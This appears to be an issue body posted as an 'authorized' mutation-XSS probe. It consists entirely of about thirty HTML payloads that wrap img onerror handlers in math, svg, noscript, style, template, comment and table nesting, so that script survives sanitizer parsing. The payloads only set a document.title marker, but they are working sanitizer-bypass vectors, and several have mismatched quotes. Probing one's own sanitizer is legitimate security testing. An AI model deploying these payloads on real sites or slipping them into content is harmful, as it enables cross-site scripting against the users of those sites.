# g5 mXSS mutation probe — issue body (own content, authorized)

Marker convention: each payload sets document.title = 'MXSS-N-RAN' if its script executes.

## 1. math/mtext/style mXSS
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="document.title='MXSS-1-RAN'">

## 2. noscript title mXSS
<noscript><p title="</noscript><img src=x onerror="document.title='MXSS-2-RAN'>">

## 3. style/textarea mXSS
<svg></p><style><a id="</style><img src=x onerror="document.title='MXSS-3-RAN'>">

## 4. xmp/form/math mXSS
<xmp><form><math><img src=x onerror="document.title='MXSS-4-RAN'">

## 5. plaintext mXSS
<plaintext><form><math><img src=x onerror="document.title='MXSS-5-RAN'">

## 6. svg/p/style mXSS
<svg><p><style><img src=x onerror="document.title='MXSS-6-RAN'"></style></svg>

## 7. math/mi mXSS
<math><mi><img src=x onerror="document.title='MXSS-7-RAN'></mi></math>

## 8. template mXSS
<template><img src=x onerror="document.title='MXSS-8-RAN'">

## 9. iframe srcdoc comment mXSS
<iframe srcdoc="<!--<iframe srcdoc='<img src=x onerror="document.title='MXSS-9-RAN'>'>">

## 10. noembed mXSS
<noembed><img src=x onerror="document.title='MXSS-10-RAN'"></noembed>

## 11. figure/figcaption mXSS
<figure><figcaption></figure><img src=x onerror="document.title='MXSS-11-RAN'">

## 12. details/summary mXSS
<details open><summary><img src=x onerror="document.title='MXSS-12-RAN'"></summary></details>

## 13. title tag mXSS
<title><img src=x onerror="document.title='MXSS-13-RAN'"></title>

## 14. textarea mXSS
<textarea><img src=x onerror="document.title='MXSS-14-RAN'"></textarea>

## 15. listing/xmp wrapped
<listing><form><math><img src=x onerror="document.title='MXSS-15-RAN'">

## 16. comment-based mXSS
<!--><img src=x onerror="document.title='MXSS-16-RAN'">-->
<!---><img src=x onerror="document.title='MXSS-17-RAN'">-->

## 17. svg foreignObject mXSS
<svg><foreignObject><iframe src=x onerror="document.title='MXSS-18-RAN'"></svg>

## 18. math annotation mXSS
<math><annotation encoding="text/html"><img src=x onerror="document.title='MXSS-19-RAN'"></annotation></math>

## 19. style tag with escaped close
<style><style/><img src=x onerror="document.title='MXSS-20-RAN'">

## 20. nested details/summary comment mXSS
<details><summary><img src=x onerror="document.title='MXSS-21-RAN'">

## 21. table/td mXSS
<table><td><img src=x onerror="document.title='MXSS-22-RAN'">

## 22. p/button/p mXSS (auto-closing)
<p><button></p><img src=x onerror="document.title='MXSS-23-RAN'">

## 23. a/datalist mXSS
<a><datalist><img src=x onerror="document.title='MXSS-24-RAN'">

## 24. annotation-xml mXSS
<math><annotation-xml encoding="text/html"><img src=x onerror="document.title='MXSS-25-RAN'"></annotation-xml></math>

## 25. svg a/foreignObject mXSS
<svg><a><foreignObject><img src=x onerror="document.title='MXSS-26-RAN'">

## 26. picture mXSS
<picture><img src=x onerror="document.title='MXSS-27-RAN'">

## 27. video/audio mXSS
<video><source><img src=x onerror="document.title='MXSS-28-RAN'">

## 28. col/colgroup mXSS
<table><col><img src=x onerror="document.title='MXSS-29-RAN'">

## 29. select/option mXSS
<select><option><img src=x onerror="document.title='MXSS-30-RAN'">

## 30. ruby mXSS
<ruby><img src=x onerror="document.title='MXSS-31-RAN'">

END
